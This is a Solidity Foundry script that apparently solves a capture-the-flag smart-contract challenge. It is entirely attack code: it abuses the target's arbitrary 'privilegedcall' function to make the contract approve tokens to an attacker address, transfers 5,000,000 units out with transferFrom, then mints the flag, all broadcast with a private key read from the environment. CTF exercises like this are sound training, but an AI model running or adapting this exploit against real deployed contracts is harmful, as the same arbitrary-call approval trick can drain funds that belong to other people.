// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

interface IChallenge11 {
    function privilegedcall(address target, bytes memory data) external;

    function transferFrom(address from, address to, uint256 amount) external;

    function mintFlag() external;
}

contract Challenge11Script is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address target = 0x3b827BDB43dc410A120f10AF3CBe26b59F4e199C;
        address attacker = 0x0000007EabfC2E6a6b33b21D2f73D58941BAb574;

        vm.startBroadcast(privateKey);

        IChallenge11 challenge = IChallenge11(target);

        // Step 1: Call privilegedcall with approve data
        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            10000000
        );
        challenge.privilegedcall(target, approveData);
        console.log("Step 1: Called privilegedcall with approve data");

        // Step 2: Call transferFrom
        challenge.transferFrom(target, attacker, 5000000);
        console.log("Step 2: Called transferFrom");

        // Step 3: Call mintFlag
        challenge.mintFlag();
        console.log("Step 3: Called mintFlag");

        vm.stopBroadcast();
    }
}
